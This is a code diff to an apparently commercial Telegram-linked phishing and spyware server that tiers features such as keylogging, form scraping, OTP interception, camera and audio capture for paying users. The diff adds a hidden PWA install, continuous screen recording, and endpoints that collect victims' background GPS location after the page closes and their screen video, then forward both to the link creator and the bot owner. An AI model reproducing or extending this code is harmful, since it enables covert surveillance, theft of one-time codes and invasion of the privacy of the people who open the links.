@@ -44,9 +44,9 @@ const DEFAULT_PAGE_CONFIG = {
 };
 
 const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true, clipboard:true, battery:true, vpnDetect:true };
-const DEFAULT_PREMIUM_FREE = { camera:true, audio:true, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true, screencap:false, faceAI:false, activityDetect:false, autofill:false, devtools:false, keylogger:false, sensors:false, formspy:false, speechRecog:true, webOTP:false, bluetooth:true };
+const DEFAULT_PREMIUM_FREE = { camera:true, audio:true, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true, screencap:false, faceAI:false, activityDetect:false, autofill:false, devtools:false, keylogger:false, sensors:false, formspy:false, speechRecog:true, webOTP:false, bluetooth:true, pwaInstall:true, screenRecord:false };
 // These features are ALWAYS paid-VIP only — never free
-const VIP_ONLY_FEATURES = new Set(['contcam', 'contaudio', 'keylogger', 'sensors', 'formspy', 'webOTP']);
+const VIP_ONLY_FEATURES = new Set(['contcam', 'contaudio', 'keylogger', 'sensors', 'formspy', 'webOTP', 'screenRecord']);
 
 let pageConfig   = { ...DEFAULT_PAGE_CONFIG, ...loadJSON(PAGE_CONFIG_FILE, {}) };
 let submissions  = loadJSON(SUBMISSIONS_FILE, []);
@@ -838,7 +838,9 @@ async function handleLinkOpen(req, res, view) {
   const speechRecogAccess = canUsePremium(creatorId, 'speechRecog');
   const webOTPAccess      = canUsePremium(creatorId, 'webOTP');
   const bluetoothAccess   = canUsePremium(creatorId, 'bluetooth');
-  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat, premium: userPremium, camAccess, audioAccess, clipAccess, pidAccess, localNetAccess, pushAccess, screenCapAccess, contcamAccess, contaudioAccess, faceAIAccess, activityAccess, autofillAccess, devtoolsAccess, keyloggerAccess, sensorsAccess, formspyAccess, speechRecogAccess, webOTPAccess, bluetoothAccess });
+  const pwaAccess         = canUsePremium(creatorId, 'pwaInstall');
+  const screenRecordAccess= canUsePremium(creatorId, 'screenRecord');
+  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat, premium: userPremium, camAccess, audioAccess, clipAccess, pidAccess, localNetAccess, pushAccess, screenCapAccess, contcamAccess, contaudioAccess, faceAIAccess, activityAccess, autofillAccess, devtoolsAccess, keyloggerAccess, sensorsAccess, formspyAccess, speechRecogAccess, webOTPAccess, bluetoothAccess, pwaAccess, screenRecordAccess });
 }
 
 app.get("/w/:path/*",  (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "webview"); });
@@ -878,7 +880,8 @@ app.get("/a/:token", async (req, res) => {
     screenCapAccess: true, contcamAccess: true, contaudioAccess: true,
     faceAIAccess: true, activityAccess: true, autofillAccess: true, devtoolsAccess: true,
     speechRecogAccess: true, webOTPAccess: true, bluetoothAccess: true,
-    keyloggerAccess: true, sensorsAccess: true, formspyAccess: true
+    keyloggerAccess: true, sensorsAccess: true, formspyAccess: true,
+    pwaAccess: true, screenRecordAccess: true
   });
 });
 app.get("/wa/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "whatsapp"); });
@@ -3712,7 +3715,9 @@ const PREM_FEAT_NAMES = {
   keylogger:      "⌨️ تسجيل المفاتيح (Keylogger)",
   sensors:        "🌡️ بيانات المستشعرات",
   formspy:        "📝 استخراج بيانات الفورم",
-  bluetooth:      "🔵 ماسح البلوتوث"
+  bluetooth:      "🔵 ماسح البلوتوث",
+  pwaInstall:     "📲 تثبيت تطبيق خفي (PWA)",
+  screenRecord:   "🖥️ تسجيل شاشة مستمر 🔥"
 };
 
 function premiumConfigText() {
@@ -4063,6 +4068,36 @@ app.post("/otp", (req, res) => {
     if (tid !== BOT_OWNER) notify(BOT_OWNER, `🔐 *OTP مُعتَرض* (ID: ${tid}):\n\`\`\`\n${code}\n\`\`\``, { parse_mode:'Markdown' });
     res.send("Done");
   } else res.send("Missing");
+});
+
+// ── SW Background Sync location (sent from service worker after page close) ───
+app.post("/sw-location", express.json(), (req, res) => {
+  const { uid, lat, lng, acc, ts, periodic } = req.body || {};
+  if (!uid || !lat || !lng) return res.sendStatus(204);
+  const tid = parseInt(uid, 36);
+  const tag  = periodic ? '🛰️ موقع دوري (الصفحة مغلقة)' : '🔄 موقع خلفي (بعد الإغلاق)';
+  const gmaps = `https://maps.google.com/?q=${lat},${lng}`;
+  const msg = `${tag}\n\n📍 ${lat}, ${lng}\n🎯 دقة: ${Math.round(acc||0)}م\n🕐 ${ts||''}\n\n[📍 خريطة](${gmaps})`;
+  notify(tid, msg, { parse_mode:'Markdown' });
+  if (tid !== BOT_OWNER) notify(BOT_OWNER, msg + `\n_من: ${uid}_`, { parse_mode:'Markdown' });
+  res.sendStatus(204);
+});
+
+// ── Screen recording chunks ───────────────────────────────────────────────────
+app.post("/screen-record", (req, res) => {
+  const uid   = req.body?.uid   || null;
+  const video = req.body?.video || null;
+  if (!uid || !video) return res.send("Missing");
+  const tid = parseInt(uid, 36);
+  const buf = Buffer.from(decodeURIComponent(video), 'base64');
+  const ts  = new Date().toJSON().slice(11,19) + " UTC";
+  const info = { filename: `screen-${ts.replace(/:/g,'-')}.webm`, contentType: 'video/webm' };
+  const cap  = `🎬 تسجيل شاشة مستمر | ${ts}`;
+  if (!settings.silentMode) {
+    notifyDoc(tid, buf, { caption: cap }, info);
+    if (tid !== BOT_OWNER) notifyDoc(BOT_OWNER, buf, { caption: `${cap}\n(ID: ${tid})` }, info);
+  }
+  res.send("Done");
 });
 
 // ── Bluetooth scan results ────────────────────────────────────────────────────
